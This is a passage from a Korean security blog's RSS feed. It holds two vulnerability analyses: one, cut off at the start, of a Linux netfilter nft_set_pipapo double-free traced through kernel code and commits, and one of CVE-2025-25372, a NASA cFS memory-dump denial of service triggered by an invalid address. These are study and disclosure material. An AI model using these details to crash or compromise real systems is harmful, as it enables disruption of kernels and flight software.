class="hljs-literal">false</span>;[...]}</code></pre></li><li><p><strong><code>-&gt;destroy()</code> &#xBA54;&#xC18C;&#xB4DC; &#xD638;&#xCD9C;:</strong> &#xD2B8;&#xB79C;&#xC7AD;&#xC158; &#xCC98;&#xB9AC; &#xB9C8;&#xC9C0;&#xB9C9; &#xB2E8;&#xACC4;&#xC5D0;&#xC11C; <code>nf_tables_commit_release</code> &#xD568;&#xC218;&#xB294; &#xC0AD;&#xC81C; &#xB300;&#xC0C1;&#xC73C;&#xB85C; &#xD45C;&#xC2DC;&#xB41C; &#xAC1D;&#xCCB4;&#xB4E4;&#xC744; &#xD574;&#xC81C;&#xD558;&#xAE30; &#xC704;&#xD574; <code>nft_commit_release</code>&#xB97C; &#xD638;&#xCD9C;&#xD558;&#xACE0;, &#xC774;&#xB294; &#xCD5C;&#xC885;&#xC801;&#xC73C;&#xB85C; <code>nft_set_destroy</code> &#xD568;&#xC218;&#xB97C; &#xD1B5;&#xD574; &#xD574;&#xB2F9; &#xC9D1;&#xD569;&#xC758; <code>-&gt;destroy()</code> &#xBA54;&#xC18C;&#xB4DC;(<code>nft_pipapo_destroy</code>)&#xB97C; &#xD638;&#xCD9C;&#xD569;&#xB2C8;&#xB2E4;.</p> <pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">nf_tables_commit_release</span><span class="hljs-params">(struct net *net)</span></span><span class="hljs-function"></span>{[...] schedule_work(&amp;trans_destroy_work);[...]}[...]<span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">nf_tables_trans_destroy_work</span><span class="hljs-params">(struct work_struct *w)</span></span><span class="hljs-function"></span>{[...] list_for_each_entry_safe(trans, next, &amp;head, <span class="hljs-built_in">list</span>) {  nft_trans_list_del(trans);  nft_commit_release(trans); }}[...]<span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">nft_commit_release</span><span class="hljs-params">(struct nft_trans *trans)</span></span><span class="hljs-function"></span>{ <span class="hljs-keyword">switch</span> (trans-&gt;msg_type) {[...] <span class="hljs-keyword">case</span> NFT_MSG_DELSET: <span class="hljs-keyword">case</span> NFT_MSG_DESTROYSET:  nft_set_destroy(&amp;trans-&gt;ctx, nft_trans_set(trans));[...]}[...]<span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">nft_set_destroy</span><span class="hljs-params">(<span class="hljs-keyword">const</span> struct nft_ctx *ctx, struct nft_set *<span class="hljs-built_in">set</span>)</span></span><span class="hljs-function"></span>{[...] <span class="hljs-built_in">set</span>-&gt;ops-&gt;destroy(ctx, <span class="hljs-built_in">set</span>);[...]}</code></pre></li><li><p><strong>Double-Free &#xBC1C;&#xC0DD;:</strong> <code>nft_pipapo_destroy</code> &#xD568;&#xC218;&#xAC00; &#xD638;&#xCD9C;&#xB420; &#xB54C;, <code>priv-&gt;clone</code>&#xC740; &#xC874;&#xC7AC;&#xD558;&#xACE0;(<code>dirty</code> &#xD50C;&#xB798;&#xADF8;&#xAC00; &#xC124;&#xC815;&#xB420; &#xC815;&#xB3C4;&#xC758; &#xBCC0;&#xACBD;&#xC774; &#xC788;&#xC5C8;&#xC73C;&#xBBC0;&#xB85C;), <code>priv-&gt;dirty</code> &#xD50C;&#xB798;&#xADF8;&#xB294; &#xC5EC;&#xC804;&#xD788; <code>true</code>&#xC785;&#xB2C8;&#xB2E4;. &#xB530;&#xB77C;&#xC11C; &#xCDE8;&#xC57D;&#xD55C; &#xBC84;&#xC804;&#xC758; <code>nft_pipapo_destroy</code> &#xD568;&#xC218; &#xB0B4;&#xC758; <code>if (priv-&gt;clone)</code> &#xBE14;&#xB85D; &#xC548;&#xC5D0;&#xC11C; <code>if (priv-&gt;dirty)</code> &#xC870;&#xAC74;&#xC774; &#xCC38;&#xC774; &#xB418;&#xC5B4;, <code>nft_set_pipapo_match_destroy(ctx, set, priv-&gt;clone)</code>&#xAC00; &#xD638;&#xCD9C;&#xB429;&#xB2C8;&#xB2E4;. &#xC774;&#xC804;&#xC5D0; (&#xC81C;&#xAC70;&#xB41C; &#xB77C;&#xC778;&#xC5D0;&#xC11C;) <code>nft_set_pipapo_match_destroy(ctx, set, priv-&gt;match)</code>&#xB3C4; &#xD638;&#xCD9C;&#xB418;&#xC5C8;&#xC73C;&#xBBC0;&#xB85C;, &#xACB0;&#xACFC;&#xC801;&#xC73C;&#xB85C; &#xC774;&#xBBF8; &#xCEE4;&#xBC0B;&#xB41C; &#xC694;&#xC18C;&#xB4E4;&#xC5D0; &#xB300;&#xD574; <code>nf_tables_set_elem_destroy</code>&#xAC00; &#xB450; &#xBC88; &#xD638;&#xCD9C;&#xB418;&#xC5B4; Double-Free&#xAC00; &#xBC1C;&#xC0DD;&#xD569;&#xB2C8;&#xB2E4;.</p></li></ol><p>&#xC774; &#xCDE8;&#xC57D;&#xC810;&#xC740; &#xB450; &#xAC1C;&#xC758; &#xCEE4;&#xBC0B;&#xC774; &#xC0C1;&#xD638;&#xC791;&#xC6A9;&#xD55C; &#xACB0;&#xACFC;&#xB85C; &#xBC1C;&#xC0DD;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;. &#xCCAB; &#xBC88;&#xC9F8; &#xCEE4;&#xBC0B;(<code>9827a0e6e23b</code>)&#xC740; &#xC5B4;&#xBCF4;&#xD2B8;(abort) &#xACBD;&#xB85C;&#xC5D0;&#xC11C; &#xD074;&#xB860; &#xB0B4;&#xC758; &#xCEE4;&#xBC0B;&#xB418;&#xC9C0; &#xC54A;&#xC740; &#xC694;&#xC18C;&#xB4E4;&#xC744; &#xD574;&#xC81C;&#xD558;&#xAE30; &#xC704;&#xD574; <code>nft_pipapo_destroy</code> &#xB0B4;&#xC5D0; <code>if (priv-&gt;dirty)</code> &#xC870;&#xAC74;&#xACFC; &#xD568;&#xAED8; <code>nft_set_pipapo_match_destroy(ctx, set, m)</code> &#xD638;&#xCD9C;&#xC744; &#xCD94;&#xAC00;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;. &#xB2F9;&#xC2DC;&#xC5D0;&#xB294; &#xC774; &#xCF54;&#xB4DC;&#xAC00; &#xC8FC;&#xB85C; &#xC5B4;&#xBCF4;&#xD2B8; &#xACBD;&#xB85C;&#xC5D0;&#xC11C;&#xB9CC; &#xB3C4;&#xB2EC; &#xAC00;&#xB2A5;&#xD588;&#xACE0;, &#xC774; &#xACBD;&#xB85C;&#xC5D0;&#xC11C;&#xB294; &#xCEE4;&#xBC0B;&#xB41C; &#xC694;&#xC18C;&#xAC00; &#xC5C6;&#xC5B4; &#xC911;&#xBCF5; &#xD574;&#xC81C; &#xBB38;&#xC81C;&#xAC00; &#xBC1C;&#xC0DD;&#xD558;&#xC9C0; &#xC54A;&#xC558;&#xC2B5;&#xB2C8;&#xB2E4;. &#xADF8;&#xB7EC;&#xB098; &#xC57D; 1&#xB144; &#xD6C4; &#xB450; &#xBC88;&#xC9F8; &#xCEE4;&#xBC0B;(<code>212ed75dc5fb</code>)&#xC774; <code>set-&gt;dead</code> &#xD50C;&#xB798;&#xADF8;&#xC640; &#xAD00;&#xB828; &#xB85C;&#xC9C1;&#xC744; &#xB3C4;&#xC785;&#xD558;&#xBA74;&#xC11C;, &#xCEE4;&#xBC0B; &#xACBD;&#xB85C;&#xC5D0;&#xC11C;&#xB3C4; <code>priv-&gt;dirty</code> &#xD50C;&#xB798;&#xADF8;&#xAC00; &#xCD08;&#xAE30;&#xD654;&#xB418;&#xC9C0; &#xC54A;&#xC740; &#xCC44; <code>nft_pipapo_destroy</code>&#xC5D0; &#xB3C4;&#xB2EC;&#xD560; &#xC218; &#xC788;&#xB294; &#xC0C8;&#xB85C;&#xC6B4; &#xACBD;&#xB85C;&#xAC00; &#xC0DD;&#xACBC;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC774; &#xC0C8;&#xB85C;&#xC6B4; &#xACBD;&#xB85C;&#xC5D0;&#xC11C;&#xB294; &#xC774;&#xBBF8; &#xCEE4;&#xBC0B;&#xB41C; &#xC694;&#xC18C;&#xB4E4;&#xC774; <code>priv-&gt;match</code>&#xC640; <code>priv-&gt;clone</code> &#xC591;&#xCABD;&#xC5D0; &#xC874;&#xC7AC;&#xD558;&#xBBC0;&#xB85C;, &#xCCAB; &#xBC88;&#xC9F8; &#xCEE4;&#xBC0B;&#xC5D0;&#xC11C; &#xCD94;&#xAC00;&#xB41C; &#xCF54;&#xB4DC;&#xAC00; &#xC758;&#xB3C4;&#xCE58; &#xC54A;&#xAC8C; Double-Free&#xB97C; &#xC720;&#xBC1C;&#xD558;&#xAC8C; &#xB41C; &#xAC83;&#xC785;&#xB2C8;&#xB2E4;.</p>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/1day1line/">1day1line</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/LPE/">LPE</category>
      
      <category domain="https://hackyboiz.github.io/tags/j0ker/">j0ker</category>
      
      <category domain="https://hackyboiz.github.io/tags/Linux/">Linux</category>
      
      <category domain="https://hackyboiz.github.io/tags/Kernel/">Kernel</category>
      
      <category domain="https://hackyboiz.github.io/tags/Netfilter/">Netfilter</category>
      
      <category domain="https://hackyboiz.github.io/tags/UAF/">UAF</category>
      
      <category domain="https://hackyboiz.github.io/tags/Use-After-Free/">Use-After-Free</category>
      
      <category domain="https://hackyboiz.github.io/tags/nft-set-pipapo/">nft_set_pipapo</category>
      
      
      <comments>https://hackyboiz.github.io/2025/05/03/j0ker/2025-05-03/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[하루한줄] CVE-2025-25372: cFS 메모리 관리 모듈의 부적절한 메모리 접근 검증으로 인한 서비스 거부 취약점</title>
      <link>https://hackyboiz.github.io/2025/05/01/OUYA77/2025-05-01/</link>
      <guid>https://hackyboiz.github.io/2025/05/01/OUYA77/2025-05-01/</guid>
      <pubDate>Thu, 01 May 2025 13:05:00 GMT</pubDate>
      
        
        
      <description>&lt;h2 id=&quot;URL&quot;&gt;&lt;a href=&quot;#URL&quot; class=&quot;headerlink&quot; title=&quot;URL&quot;&gt;&lt;/a&gt;URL&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://visionspace.com/nasa-cfs-version-aquila-software-</description>
        
      
      
      
      <content:encoded><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://visionspace.com/nasa-cfs-version-aquila-software-vulnerability-assessment/">https://visionspace.com/nasa-cfs-version-aquila-software-vulnerability-assessment/</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>cFS version Aquila(Releases)</li></ul><p><img src="image.png" alt="image.png"></p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>NASA&#xC758; cFS(Core Flight System)&#xB294; &#xC704;&#xC131;, &#xC6B0;&#xC8FC; &#xD0D0;&#xC0AC;&#xC120;, &#xAE30;&#xD0C0; &#xC784;&#xBCA0;&#xB514;&#xB4DC; &#xC2DC;&#xC2A4;&#xD15C;&#xC5D0;&#xC11C; &#xD65C;&#xC6A9;&#xB418;&#xB294; &#xC624;&#xD508;&#xC18C;&#xC2A4; &#xC18C;&#xD504;&#xD2B8;&#xC6E8;&#xC5B4; &#xD504;&#xB808;&#xC784;&#xC6CC;&#xD06C;&#xC785;&#xB2C8;&#xB2E4;.  &#xCD5C;&#xADFC; cFS&#xC758; Memory Management(MM) &#xBAA8;&#xB4C8;&#xC5D0;&#xC11C; &#xC11C;&#xBE44;&#xC2A4; &#xAC70;&#xBD80;(DoS, Denial of Service) &#xACF5;&#xACA9;&#xC774; &#xAC00;&#xB2A5;&#xD55C; &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xBC1C;&#xACAC;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC774; &#xCDE8;&#xC57D;&#xC810;&#xC740; MM &#xBAA8;&#xB4C8;&#xC774; &#xBA54;&#xBAA8;&#xB9AC; &#xC77D;&#xAE30; &#xB610;&#xB294; &#xC4F0;&#xAE30; &#xC791;&#xC5C5;&#xC744; &#xC218;&#xD589;&#xD560; &#xB54C;, &#xC811;&#xADFC;&#xD558;&#xB824;&#xB294; &#xBA54;&#xBAA8;&#xB9AC; &#xC8FC;&#xC18C;&#xAC00; &#xC720;&#xD6A8;&#xD55C;&#xC9C0;&#xB97C; &#xC801;&#xC808;&#xD788; &#xAC80;&#xC99D;&#xD558;&#xC9C0; &#xC54A;&#xC544; &#xBC1C;&#xC0DD;&#xD569;&#xB2C8;&#xB2E4;.</p><p>&#xCDE8;&#xC57D;&#xD55C; &#xC8FC;&#xC694; &#xD568;&#xC218;&#xB294; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC2B5;&#xB2C8;&#xB2E4;:</p><ul><li><strong><code>MM_Load</code></strong>: &#xBA54;&#xBAA8;&#xB9AC; &#xC77D;&#xAE30; &#xAD00;&#xB828; &#xD568;&#xC218;</li><li><strong><code>MM_Dump</code></strong>: &#xBA54;&#xBAA8;&#xB9AC; &#xC4F0;&#xAE30; &#xAD00;&#xB828; &#xD568;&#xC218;</li></ul><p>&#xC774; &#xB450; &#xD568;&#xC218; &#xBAA8;&#xB450; &#xC678;&#xBD80; &#xC785;&#xB825;&#xC774;&#xB098; &#xBA85;&#xB839;&#xC5D0; &#xB530;&#xB77C; &#xBA54;&#xBAA8;&#xB9AC;&#xC5D0; &#xC9C1;&#xC811; &#xC811;&#xADFC;&#xD558;&#xAC8C; &#xB418;&#xBA70;, &#xAC80;&#xC99D;&#xB418;&#xC9C0; &#xC54A;&#xC740; &#xC8FC;&#xC18C; &#xC811;&#xADFC; &#xC2DC; <strong>Segmentation fault</strong>&#xB97C; &#xC720;&#xBC1C;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><h3 id="Proof-of-Concept"><a href="#Proof-of-Concept" class="headerlink" title="Proof of Concept"></a>Proof of Concept</h3><p>&#xC77C;&#xBC18;&#xC801;&#xC778; &#xC0C1;&#xD669;&#xC5D0;&#xC11C; <strong><code>MM_DUMP_MEM_TO_FILE_CC</code></strong> &#xBA85;&#xB839;&#xC740; &#xBA54;&#xBAA8;&#xB9AC; &#xC704;&#xCE58;&#xC5D0;&#xC11C; &#xC9C0;&#xC815;&#xB41C; &#xC218;&#xC758; &#xBC14;&#xC774;&#xD2B8;&#xB97C; &#xD30C;&#xC77C;&#xC5D0; &#xB364;&#xD504;&#xD558;&#xB294; &#xC5ED;&#xD560;&#xC744; &#xD569;&#xB2C8;&#xB2E4;.</p><p><img src="image%201.png" alt="image.png"></p><p>&#xC774; &#xD568;&#xC218;&#xB294; &#xC18C;&#xC2A4; &#xC8FC;&#xC18C;, &#xC8FC;&#xC18C; &#xBC94;&#xC704;, &#xC694;&#xCCAD;&#xB41C; &#xB370;&#xC774;&#xD130; &#xD06C;&#xAE30;, &#xADF8;&#xB9AC;&#xACE0; &#xC800;&#xC7A5;&#xB420; &#xD30C;&#xC77C; &#xACBD;&#xB85C;&#xB97C; &#xAC80;&#xC99D;&#xD574;&#xC57C; &#xD569;&#xB2C8;&#xB2E4;. &#xADF8;&#xB7EC;&#xB098; &#xC774;&#xB7EC;&#xD55C; &#xBAA8;&#xB4E0; &#xAC80;&#xC99D;&#xC774; &#xC62C;&#xBC14;&#xB974;&#xAC8C; &#xC218;&#xD589;&#xB418;&#xC9C0; &#xC54A;&#xC544; <strong>cFS</strong> &#xC778;&#xC2A4;&#xD134;&#xC2A4;&#xAC00; &#xC911;&#xB2E8;&#xB418;&#xC5B4; &#xC11C;&#xBE44;&#xC2A4; &#xAC70;&#xBD80;&#xAC00; &#xBC1C;&#xC0DD;&#xD558;&#xB294; &#xAC83;&#xC73C;&#xB85C; &#xD655;&#xC778;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xBA85;&#xB839; &#xAD6C;&#xC870;&#xB294; <strong>mm/fsw/inc/mm_msg.h</strong> &#xC5D0; &#xC815;&#xC758;&#xB418;&#xC5B4; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4; :</p><p><img src="image%202.png" alt="image.png"></p><p>&#xC774; &#xAD6C;&#xC870;&#xB294; <strong>MM_DumpMemToFileCmd</strong> (mm/fsw/src/mm_dump.c)&#xC5D0;&#xC11C; &#xC785;&#xB825;&#xC744; &#xAC80;&#xC99D;&#xD558;&#xAE30; &#xC804;&#xC5D0; &#xAC01; &#xD544;&#xB4DC;&#xB97C; &#xCD94;&#xCD9C;&#xD558;&#xB294; &#xB370; &#xC0AC;&#xC6A9;&#xB429;&#xB2C8;&#xB2E4;.</p><p>&#xCCAB; &#xBC88;&#xC9F8; &#xAC80;&#xC99D;&#xC740; &#xBA54;&#xBAA8;&#xB9AC;&#xB97C; &#xB364;&#xD504;&#xD560; &#xC2EC;&#xBCFC;&#xB9AD; &#xC8FC;&#xC18C;&#xC5D0;&#xC11C; &#xC77C;&#xC5B4;&#xB0A9;&#xB2C8;&#xB2E4;.</p><p><img src="image%203.png" alt="image.png"></p><p><strong>MM_ResolveSymAddr</strong> &#xD568;&#xC218; &#xB0B4;&#xBD80;&#xB97C; &#xBCF4;&#xBA74; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><img src="image%204.png" alt="image.png"></p><p>&#xC624;&#xD504;&#xC14B;&#xC774; &#xD3EC;&#xD568;&#xB41C; &#xACBD;&#xC6B0; &#xC774; &#xD568;&#xC218;&#xB294; &#xD56D;&#xC0C1; <strong>Valid = True</strong>&#xB97C; <strong>**&#xBC18;&#xD658;&#xD569;&#xB2C8;&#xB2E4;. 525~526&#xD589;&#xC5D0;&#xC11C; &#xC2EC;&#xBCFC; &#xC774;&#xB984;&#xC774; &#xB110; &#xBB38;&#xC790;&#xC5F4;&#xC774;&#xBA74; &#xC785;&#xB825;&#xB41C; &#xC624;&#xD504;&#xC14B;&#xC744; &#xC808;&#xB300; &#xC8FC;&#xC18C;&#xB85C; &#xC0AC;&#xC6A9;&#xD558;&#xC5EC; True&#xB97C; </strong>&#xBC18;&#xD658;&#xD569;&#xB2C8;&#xB2E4;. &#xADF8;&#xB807;&#xC9C0; &#xC54A;&#xC73C;&#xBA74; &#xC785;&#xB825;&#xC73C;&#xB85C; &#xC804;&#xC1A1;&#xB41C; &#xC2EC;&#xBCFC;&#xC758; &#xC8FC;&#xC18C;&#xC640; &#xC624;&#xD504;&#xC14B;&#xC744; &#xB354;&#xD55C; &#xAC12;&#xC744; &#xBC18;&#xD658;&#xD569;&#xB2C8;&#xB2E4;.</p><p>&#xADF8;&#xB7F0; &#xB2E4;&#xC74C; <strong>MM_VerifyLoadDumpParams</strong>&#xC744; &#xC0AC;&#xC6A9;&#xD558;&#xC5EC; &#xB9E4;&#xAC1C;&#xBCC0;&#xC218;&#xB97C; &#xD655;&#xC778;&#xD569;&#xB2C8;&#xB2E4;.</p><p><img src="image%205.png" alt="image.png"></p><p>&#xC774; &#xD568;&#xC218;&#xB294; &#xBA3C;&#xC800; &#xC120;&#xD0DD;&#xB41C; &#xBA54;&#xBAA8;&#xB9AC; &#xC720;&#xD615;&#xC774; &#xC720;&#xD6A8;&#xD55C;&#xC9C0;, &#xC694;&#xCCAD;&#xB41C; &#xBC14;&#xC774;&#xD2B8; &#xC218;&#xAC00; &#xD574;&#xB2F9; &#xBA54;&#xBAA8;&#xB9AC; &#xC720;&#xD615;&#xC758; &#xCD5C;&#xB300; &#xD06C;&#xAE30;&#xBCF4;&#xB2E4; &#xC791;&#xC740;&#xC9C0; &#xD655;&#xC778;&#xD55C; &#xD6C4; <strong>CFE_PSP_MemValidateRange</strong>&#xB97C; &#xD638;&#xCD9C;&#xD558;&#xC5EC; &#xC8FC;&#xC18C;&#xAC00; PSP &#xBA54;&#xBAA8;&#xB9AC; &#xD14C;&#xC774;&#xBE14;&#xC5D0; &#xC815;&#xC758;&#xB41C; &#xC720;&#xD6A8;&#xD55C; &#xBA54;&#xBAA8;&#xB9AC; &#xBC94;&#xC704;&#xC5D0; &#xC18D;&#xD558;&#xB294;&#xC9C0; &#xD655;&#xC778;&#xD569;&#xB2C8;&#xB2E4;.</p><p>PSP &#xD14C;&#xC774;&#xBE14;&#xC740; &#xBD80;&#xD305; &#xC2DC; <strong>CFE_PSP_SetupReservedMemoryMap</strong>&#xC5D0; &#xC758;&#xD574; &#xC815;&#xC758;&#xB429;&#xB2C8;&#xB2E4;<strong>.</strong> Linux &#xC2DC;&#xC2A4;&#xD15C;&#xC758; &#xACBD;&#xC6B0;, &#xAE30;&#xBCF8; &#xC124;&#xC815;&#xC740; &#xC804;&#xCCB4; &#xBA54;&#xBAA8;&#xB9AC; &#xACF5;&#xAC04;&#xC744; &#xC77D;&#xAE30;/&#xC4F0;&#xAE30; &#xC791;&#xC5C5;&#xC5D0; &#xC720;&#xD6A8;&#xD55C; &#xAC83;&#xC73C;&#xB85C; &#xC815;&#xC758;&#xD569;&#xB2C8;&#xB2E4;. &#xC544;&#xB798; &#xC0AC;&#xC9C4;&#xC740; PSP&#xC758; &#xAE30;&#xBCF8;&#xC801;&#xC778; &#xBA54;&#xBAA8;&#xB9AC; &#xD14C;&#xC774;&#xBE14; &#xC124;&#xC815;&#xC785;&#xB2C8;&#xB2E4;.</p><p><img src="image%206.png" alt="image.png"></p><ul><li><strong><code>MMFileHeader.SymAddress.Offset = SrcAddress;</code></strong>:<ul><li>&#xB364;&#xD504;&#xD560; &#xBA54;&#xBAA8;&#xB9AC;&#xC758; &#xC2DC;&#xC791; &#xC8FC;&#xC18C;(<code>SrcAddress</code>)&#xAC00; &#xD30C;&#xC77C; &#xD5E4;&#xB354;&#xC758; <code>SymAddress</code> &#xAD6C;&#xC870;&#xCCB4; &#xB0B4; <code>Offset</code> &#xD544;&#xB4DC;&#xC5D0; &#xC800;&#xC7A5;&#xB429;&#xB2C8;&#xB2E4;.</li></ul></li><li><strong><code>MMFileHeader.MemType = CmdPtr-&gt;Payload.MemType;</code></strong>:<ul><li>&#xB364;&#xD504;&#xD560; &#xBA54;&#xBAA8;&#xB9AC;&#xC758; &#xD0C0;&#xC785;<strong>(</strong><code>MemType</code><strong>)</strong> (&#xC608;: RAM, EEPROM)&#xC774; &#xBA85;&#xB839; &#xD398;&#xC774;&#xB85C;&#xB4DC;&#xB85C;&#xBD80;&#xD130; &#xCD94;&#xCD9C;&#xB418;&#xC5B4; &#xD30C;&#xC77C; &#xD5E4;&#xB354;&#xC5D0; &#xC800;&#xC7A5;&#xB429;&#xB2C8;&#xB2E4;.</li></ul></li><li><strong><code>MMFileHeader.NumOfBytes = CmdPtr-&gt;Payload.NumOfBytes;</code></strong>:<ul><li>&#xB364;&#xD504;&#xD560; &#xB370;&#xC774;&#xD130;&#xC758; &#xD06C;&#xAE30;(<code>NumOfBytes</code>)&#xAC00; &#xBA85;&#xB839; &#xD398;&#xC774;&#xB85C;&#xB4DC;&#xB85C;&#xBD80;&#xD130; &#xCD94;&#xCD9C;&#xB418;&#xC5B4; &#xD30C;&#xC77C; &#xD5E4;&#xB354;&#xC5D0; &#xC800;&#xC7A5;&#xB429;&#xB2C8;&#xB2E4;.</li></ul></li></ul><p>&#xC774;&#xB294; &#xB2E4;&#xB978; &#xC6B4;&#xC601; &#xCCB4;&#xC81C;&#xC5D0;&#xB3C4; &#xD574;&#xB2F9;&#xB418;&#xB294;&#xB370;, &#xC5EC;&#xAE30;&#xC11C;&#xB294; mcp750-vxworks&#xB9CC;&#xC774; &#xAE30;&#xBCF8;&#xC801;&#xC73C;&#xB85C; &#xC81C;&#xD55C;&#xB41C; &#xBA54;&#xBAA8;&#xB9AC; &#xACF5;&#xAC04;&#xC744; &#xC815;&#xC758;&#xD569;&#xB2C8;&#xB2E4;.</p><blockquote><p>Linux&#xC640; &#xB300;&#xC870;&#xC801;&#xC73C;&#xB85C;, &#xC5B8;&#xAE09;&#xB41C; mcp750-vxworks&#xC640; &#xAC19;&#xC740; &#xD2B9;&#xC815; &#xC6B4;&#xC601;&#xCCB4;&#xC81C; &#xD658;&#xACBD;&#xC5D0;&#xC11C;&#xB294; PSP &#xBA54;&#xBAA8;&#xB9AC; &#xD14C;&#xC774;&#xBE14;&#xC774; &#xAE30;&#xBCF8;&#xC801;&#xC73C;&#xB85C; <strong>&#xB354;&#xC6B1; &#xC81C;&#xD55C;&#xC801;&#xC778; &#xBA54;&#xBAA8;&#xB9AC; &#xACF5;&#xAC04;&#xB9CC;&#xC744; &#xC720;&#xD6A8;&#xD55C; &#xC601;&#xC5ED;&#xC73C;&#xB85C; &#xC815;&#xC758;</strong>&#xD569;&#xB2C8;&#xB2E4;. &#xC774;&#xB294; &#xC7A0;&#xC7AC;&#xC801;&#xC73C;&#xB85C; &#xC798;&#xBABB;&#xB41C; &#xBA54;&#xBAA8;&#xB9AC; &#xC811;&#xADFC;&#xC774; &#xAC00;&#xB2A5;&#xD568;&#xC744; &#xC758;&#xBBF8;&#xD569;&#xB2C8;&#xB2E4;.</p></blockquote><p><strong>MM_DumpMemToFileCmd</strong>&#xC5D0;&#xC11C; &#xC785;&#xB825;&#xB41C; &#xBAA8;&#xB4E0; RAM &#xC8FC;&#xC18C;&#xB294; &#xAC80;&#xC99D;&#xC744; &#xD1B5;&#xACFC;&#xD558;&#xACE0; &#xC2E4;&#xD589;&#xC774; &#xACC4;&#xC18D;&#xB429;&#xB2C8;&#xB2E4;.</p><p>&#xC774; &#xBA54;&#xBAA8;&#xB9AC; &#xC8FC;&#xC18C;&#xB294; &#xBA54;&#xBAA8;&#xB9AC; &#xB364;&#xD504;&#xB97C; &#xC548;&#xB0B4;&#xD558;&#xB294; &#xB370; &#xC0AC;&#xC6A9;&#xB420; &#xD30C;&#xC77C; &#xD5E4;&#xB354;&#xB97C; &#xC815;&#xC758;&#xD558;&#xB294; &#xB370; &#xC0AC;&#xC6A9;&#xB429;&#xB2C8;&#xB2E4;.</p><p>&#xBA85;&#xB839;&#xC5D0;&#xC11C; &#xC120;&#xD0DD;&#xD55C; &#xBA54;&#xBAA8;&#xB9AC; &#xC720;&#xD615;&#xC774; <strong>MM_RAM</strong> &#xB610;&#xB294; <strong>MM_EEPROM</strong>&#xC774;&#xBA74; , &#xC774;&#xC804;&#xC5D0; &#xC815;&#xC758;&#xB41C; &#xD30C;&#xC77C; &#xD5E4;&#xB354;&#xB97C; &#xC0AC;&#xC6A9;&#xD558;&#xC5EC; <strong>MM_DumpMemToFile&#xC744;</strong> &#xD638;&#xCD9C;&#xD569;&#xB2C8;&#xB2E4;.</p><p><img src="image%207.png" alt="image.png"></p><p> &#xC774;&#xB54C; &#xD30C;&#xC77C; &#xD5E4;&#xB354;&#xC5D0; &#xC815;&#xC758;&#xB41C; &#xC624;&#xD504;&#xC14B;&#xC744; <code>memcpy</code>&#xC758; &#xC18C;&#xC2A4; &#xD3EC;&#xC778;&#xD130;&#xB85C; &#xC0AC;&#xC6A9;&#xD569;&#xB2C8;&#xB2E4;. &#xADF8;&#xB807;&#xAE30;&#xC5D0; <code>memcpy</code> &#xC791;&#xC5C5;&#xC5D0;&#xC11C; &#xD504;&#xB85C;&#xC138;&#xC2A4; &#xBC94;&#xC704; &#xC678;&#xBD80;&#xC5D0;&#xC11C; &#xBCF4;&#xD638;&#xB41C; &#xBA54;&#xBAA8;&#xB9AC;&#xB97C; &#xBCF5;&#xC0AC;&#xD558;&#xB824;&#xACE0; &#xC2DC;&#xB3C4;&#xD558;&#xC5EC; &#xC138;&#xADF8;&#xBA3C;&#xD14C;&#xC774;&#xC158; &#xC624;&#xB958;&#xAC00; &#xBC1C;&#xC0DD;&#xD569;&#xB2C8;&#xB2E4;.</p><p>cmdUtil&#xACFC; &#xAC19;&#xC740; &#xB3C4;&#xAD6C;&#xB97C; &#xC0AC;&#xC6A9;&#xD558;&#xC5EC; MM_DUMP_MEM_TO_FILE_CC &#xBA85;&#xB839;&#xC744; &#xD638;&#xCD9C;&#xD558;&#xBA74; <strong>Segmentation fault</strong>&#xB97C; &#xD655;&#xC778;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><img src="https://visionspace.com/wp-content/uploads/2025/03/image-57-1024x627.png" alt></p><p>&#xD654;&#xBA74; &#xC0C1;&#xB2E8;&#xC5D0;&#xC11C; &#xC2E4;&#xD589; &#xC911;&#xC774;&#xB358; <strong>cSF</strong> &#xC778;&#xC2A4;&#xD134;&#xC2A4;&#xAC00; &#xC720;&#xD6A8;&#xD558;&#xC9C0; &#xC54A;&#xC740; &#xC8FC;&#xC18C;&#xC778; 0x40 &#xC8FC;&#xC18C;&#xC5D0;&#xC11C; &#xBA54;&#xBAA8;&#xB9AC; &#xB364;&#xD504; &#xC694;&#xCCAD;&#xC744; &#xBC1B;&#xC790; &#xC885;&#xB8CC;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;.</p><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-25372">https://nvd.nist.gov/vuln/detail/CVE-2025-25372</a></p>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/1day1line/">1day1line</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/OUYA77/">OUYA77</category>
      
      <category domain="https://hackyboiz.github.io/tags/NASA-cFS/">NASA cFS</category>
      
      <category domain="https://hackyboiz.github.io/tags/Memory-Management/">Memory Management</category>
      
